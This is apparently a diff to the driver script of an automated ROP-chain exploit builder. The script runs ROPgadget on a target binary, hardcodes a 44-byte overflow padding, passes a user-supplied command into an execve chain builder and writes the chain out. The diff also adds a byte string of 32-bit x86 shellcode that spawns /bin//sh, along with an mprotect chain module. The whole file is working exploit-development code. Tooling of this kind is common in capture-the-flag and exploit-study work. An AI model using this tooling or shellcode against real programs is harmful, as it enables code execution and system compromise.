@@ -4,6 +4,9 @@ from io import StringIO
 from ParseChain import *
 from GadgetFinder import *
 from ExecveBuilder import *
+from MprotectBuilder import *
+
+import gdb
 
 
 def main():
@@ -16,9 +19,10 @@ def main():
 
     binary = args.binary[0]
 
-    #buffer = gdb.get_padding_gdb(binary)
+    buffer = 44 #gdb.get_padding_gdb(binary)
     #print("Found padding length of " + str(buffer))
 
+    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
     eb = ExecveBuilder(['eax', 'ebx', 'ecx', 'edx'])
 
     command_rg = ["python3", "./ROPgadget/ROPgadget.py", "--binary", args.binary[0], "--ropchain"]
@@ -35,7 +39,10 @@ def main():
 
     with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
         output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
-        eb.build_chain(output_stream)
+        eb.build_chain(output_stream, args.c.split(' ')[0], args.c.split(' ')[1:], buffer)
+        #eb.build_chain(output_stream, shellcode, buffer)
+
+    eb.write_chain()
 
     gadgets = eb.gadget_finder.gadgets
     for k, v in gadgets.items():
